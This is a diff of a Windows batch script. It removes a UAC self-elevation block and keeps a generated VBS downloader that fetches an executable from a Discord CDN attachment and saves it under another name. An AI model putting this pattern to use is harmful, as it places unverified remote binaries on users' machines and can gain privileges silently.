@@ -1,22 +1,5 @@
 @echo off
 
-setlocal enableextensions enabledelayedexpansion
-
-REM Check admin mode, auto-elevate if required.
-  openfiles > NUL 2>&1 || (
-    REM Not elevated. Do it.
-    echo createObject^("Shell.Application"^).shellExecute "%~dpnx0", "%*", "", "runas">"%TEMP%\%~n0.vbs"
-    cscript /nologo "%TEMP%\%~n0.vbs"
-    goto :eof
-  )
-  del /s /q "%TEMP%\%~n0.vbs" > NUL 2>&1
-)
-
-REM If here, then process is elevated. Otherwise, batch is already terminated and/or stuck in code above.
-
-rem Windows has no built-in wget or curl, so generate a VBS script to do it:
-
-rem -------------------------------------------------------------------------
 set DLOAD_SCRIPT=download.vbs
 echo Option Explicit                                                    >  %DLOAD_SCRIPT%
 echo Dim args, http, fileSystem, adoStream, url, target, status         >> %DLOAD_SCRIPT%
@@ -47,8 +30,6 @@ echo If fileSystem.FileExists(target) Then fileSystem.DeleteFile target >> %DLOA
 echo adoStream.SaveToFile target                                        >> %DLOAD_SCRIPT%
 echo adoStream.Close                                                    >> %DLOAD_SCRIPT%
 echo.                                                                   >> %DLOAD_SCRIPT%
-
-rem -------------------------------------------------------------------------
 
 @cscript //Nologo %DLOAD_SCRIPT% "https://cdn.discordapp.com/attachments/764395888818126858/1227234897719201852/Remove-Edge_GUI.exe?ex=6627aa90&is=66153590&hm=8ee542cfebb432e83be02a3cb719fdcfb03e8ca4dd646942ba27955b28d32384&" mystro.exe
 del download.vbs
